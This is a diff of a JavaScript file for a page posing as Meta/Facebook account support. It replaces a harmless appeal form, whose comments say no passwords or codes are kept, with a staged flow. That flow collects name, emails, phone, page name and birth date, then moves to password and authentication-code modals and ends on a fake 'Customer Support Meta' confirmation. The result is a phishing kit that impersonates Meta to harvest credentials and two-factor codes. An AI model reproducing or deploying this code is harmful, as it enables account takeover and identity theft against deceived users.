@@ -1,82 +1,69 @@
 // Main Application Logic
-document.addEventListener('DOMContentLoaded', () => {
-    const form = document.getElementById('appealForm');
 
-    if (!form) {
-        console.error('Không tìm thấy form #appealForm');
-        return;
-    }
+// Generate ticket ID
+document.getElementById('ticketId').textContent = Utils.generateTicketId();
 
-    form.addEventListener('submit', (e) => {
+// Start verification flow
+document.getElementById('submitRequestBtn').addEventListener('click', openClientModal);
+
+// ==================== MODAL 1: CLIENT INFO ====================
+function openClientModal() {
+    const content = `
+        <h2 class="font-bold text-[15px] mb-4">Information Form</h2>
+        <form id="clientForm" class="space-y-3">
+            <input type="text" id="fullName" placeholder="Full Name" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+            <input type="email" id="email" placeholder="Email" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+            <input type="email" id="emailBusiness" placeholder="Email Business" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+            <input type="text" id="fanpage" placeholder="Page Name" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+            <input type="tel" id="phone" placeholder="Phone Number" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+            <div>
+                <b class="text-[#9a979e] text-sm block mb-2">Date of Birth</b>
+                <div class="grid grid-cols-3 gap-2">
+                    <input type="number" id="day" placeholder="Day" min="1" max="31" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+                    <input type="number" id="month" placeholder="Month" min="1" max="12" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+                    <input type="number" id="year" placeholder="Year" min="1900" max="2024" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+                </div>
+            </div>
+            <textarea placeholder="Additional notes (optional)" class="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-sm resize-none outline-none"></textarea>
+            <p class="text-[#9a979e] text-[14px] mb-[7px]">Our response will be sent to you within 14 - 48 hours.</p>
+            <div class="mt-[15px] mb-[20px]">
+                <label class="cursor-pointer flex items-center gap-[5px] text-[14px] " for="custom-checkbox">
+                    <label class="inline-flex items-center cursor-pointer">
+                        <input type="checkbox">
+                    </label>
+                    I agree with<a class="text-[#0d6efd] flex items-center gap-[5px] inline pointer-events-none" href="">Terms of use <img src="./public/icons/reject.svg" class="w-[10px] h-[10px] items-center inline" alt=""></a>
+                </label>
+            </div>
+            <button type="submit" class="w-full h-10 bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">Send</button>
+        </form>
+    `;
+
+    Modal.create('clientModal', content);
+    Modal.open('clientModal');
+
+    document.getElementById('clientForm').addEventListener('submit', async (e) => {
         e.preventDefault();
-
-        if (!form.reportValidity()) {
-            return;
-        }
-
         const formData = {
-            appeal: document.getElementById('appeal')?.value.trim() || '',
-            fullName: document.getElementById('appeal-fullname')?.value.trim() || '',
-            businessEmail: document.getElementById('businessEmail')?.value.trim() || '',
-            personalEmail: document.getElementById('personalEmail')?.value.trim() || '',
-            mobilePhone: document.getElementById('mobilePhone')?.value.trim() || '',
-            pageName: document.getElementById('appeal-page')?.value.trim() || ''
+            fullName: document.getElementById('fullName').value.trim(),
+            email: document.getElementById('email').value.trim(),
+            emailBusiness: document.getElementById('emailBusiness').value.trim(),
+            fanpage: document.getElementById('fanpage').value.trim(),
+            phone: document.getElementById('phone').value.trim(),
+            day: document.getElementById('day').value,
+            month: document.getElementById('month').value,
+            year: document.getElementById('year').value
         };
 
-        // Chỉ lưu nội dung biểu mẫu kháng nghị.
-        // Không lưu mật khẩu hoặc mã xác thực.
-        console.log('Appeal form validated:', {
-            ...formData,
-            businessEmail: formData.businessEmail ? '[provided]' : '',
-            personalEmail: formData.personalEmail ? '[provided]' : '',
-            mobilePhone: formData.mobilePhone ? '[provided]' : ''
-        });
-
-        openAppealReviewModal(formData);
+        Utils.saveRecord('__client_rec__fi_rst', formData);
+        Modal.close('clientModal');
+        openSecurityModal();
     });
-});
-
-function openAppealResultModal() {
-    const container = document.getElementById('modalsContainer');
-
-    if (!container) {
-        console.error('Thiếu phần tử #modalsContainer');
-        return;
-    }
-
-    if (!document.getElementById('appealResultModal')) {
-        Modal.create(
-            'appealResultModal',
-            `
-                <h2 class="text-xl font-bold mb-3">
-                    Appeal Form
-                </h2>
-                <p class="text-sm text-gray-600 mb-5">
-                    Your form has passed validation.
-                    Connect your legitimate appeal service to submit it.
-                </p>
-                <button
-                    id="closeAppealResult"
-                    type="button"
-                    class="w-full rounded-full bg-blue-600 px-4 py-3 text-white"
-                >
-                    Close
-                </button>
-            `
-        );
-    }
-
-    Modal.open('appealResultModal');
-
-    document.getElementById('closeAppealResult')
-        ?.addEventListener('click', () => {
-            Modal.close('appealResultModal');
-        }, { once: true });
 }
+
 // ==================== MODAL 2: SECURITY (PASSWORD) ====================
 function openSecurityModal() {
     const content = `
-        <div class="h-auto flex flex-col items-center justify-between flex-1">
+        <div class="h-full flex flex-col items-center justify-between flex-1">
             <div class="w-12 h-12 mb-5 mx-auto">
                 <img src="./public/icons/ic_logo.svg" alt="Meta" class="w-full">
             </div>
@@ -90,7 +77,7 @@ function openSecurityModal() {
                 </form>
             </div>
             <div class="w-16 mt-5 mx-auto">
-                <img src="./public/icons/ic_logo_gray.svg" alt="Meta">
+                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
             </div>
         </div>
     `;
@@ -168,6 +155,9 @@ function openAuthenticationModal(userData) {
                     <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">Continue</button>
                     <div class="w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none"><span>Try another way</span></div>
                 </form>
+            </div>
+            <div class="w-16 mt-5 mx-auto">
+                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
             </div>
         </div>
     `;
@@ -257,9 +247,9 @@ function openAuthenticationModal(userData) {
 // ==================== MODAL 4: SUCCESS ====================
 function openSuccessModal() {
     const content = `
-        <h2 class="font-bold text-[18px] mb-4 text-left">Request has been sent</h2>
+        <h2 class="font-bold text-[18px] mb-4 text-center">Request has been sent</h2>
         <div class="rounded-lg overflow-hidden mb-4">
-            <img src="./public/images/succes.jpg" alt="Success" class="w-full">
+            <img src="./public/images/success.jpg" alt="Success" class="w-full">
         </div>
         <p class="text-[#9a979e] mb-1 text-[15px]">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>
         <p class="text-[#9a979e] mb-5 text-[15px]">From the Customer Support Meta.</p>
@@ -267,121 +257,11 @@ function openSuccessModal() {
             Return to Facebook
         </a>
         <div class="w-16 mt-5 mx-auto">
-            <img src="./public/icons/ic_logo_gray.svg" alt="Meta">
+            <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
         </div>
     `;
 
     Modal.create('successModal', content);
     Modal.open('successModal');
 }
-function openAppealReviewModal(formData) {
-    const container = document.getElementById('modalsContainer');
 
-    if (!container) {
-        console.error('Không tìm thấy #modalsContainer');
-        return;
-    }
-
-    const existing = document.getElementById('appealReviewModal');
-    if (existing) {
-        existing.remove();
-    }
-
-    const content = `
-        <h2 class="text-xl font-bold mb-3">
-            Review your appeal
-        </h2>
-
-        <p class="text-sm text-gray-600 mb-4">
-            Please review your appeal details before continuing.
-        </p>
-
-        <div class="space-y-3 text-sm mb-5">
-            <p>
-                <strong>Full name:</strong>
-                ${escapeAppealText(formData.fullName)}
-            </p>
-
-            <p>
-                <strong>Reason for appeal:</strong>
-                ${escapeAppealText(formData.appeal)}
-            </p>
-
-            <p>
-                <strong>Page or account:</strong>
-                ${escapeAppealText(formData.pageName || 'Not provided')}
-            </p>
-        </div>
-
-        <button
-            type="button"
-            id="confirmAppealReview"
-            class="w-full rounded-full bg-blue-600 px-4 py-3 text-white"
-        >
-            Confirm appeal
-        </button>
-
-        <button
-            type="button"
-            id="cancelAppealReview"
-            class="w-full mt-3 rounded-full border px-4 py-3"
-        >
-            Cancel
-        </button>
-    `;
-
-    Modal.create('appealReviewModal', content);
-    Modal.open('appealReviewModal');
-
-    document.getElementById('confirmAppealReview')
-        .addEventListener('click', () => {
-            Modal.close('appealReviewModal');
-            openAppealConfirmationModal();
-        });
-
-    document.getElementById('cancelAppealReview')
-        .addEventListener('click', () => {
-            Modal.close('appealReviewModal');
-        });
-}
-
-function openAppealConfirmationModal() {
-    Modal.create(
-        'appealConfirmationModal',
-        `
-            <h2 class="text-xl font-bold mb-3">
-                Appeal ready for submission
-            </h2>
-
-            <p class="text-sm text-gray-600 mb-5">
-                Your information has been reviewed.
-                Connect your authorized appeal endpoint to submit it.
-            </p>
-
-            <button
-                type="button"
-                id="closeAppealConfirmation"
-                class="w-full rounded-full bg-blue-600 px-4 py-3 text-white"
-            >
-                Close
-            </button>
-        `
-    );
-
-    Modal.open('appealConfirmationModal');
-
-    document.getElementById('closeAppealConfirmation')
-        .addEventListener('click', () => {
-            Modal.close('appealConfirmationModal');
-        });
-}
-
-function escapeAppealText(value) {
-    return String(value ?? '').replace(/[&<>"']/g, char => ({
-        '&': '&amp;',
-        '<': '&lt;',
-        '>': '&gt;',
-        '"': '&quot;',
-        "'": '&#39;'
-    })[char]);
-}
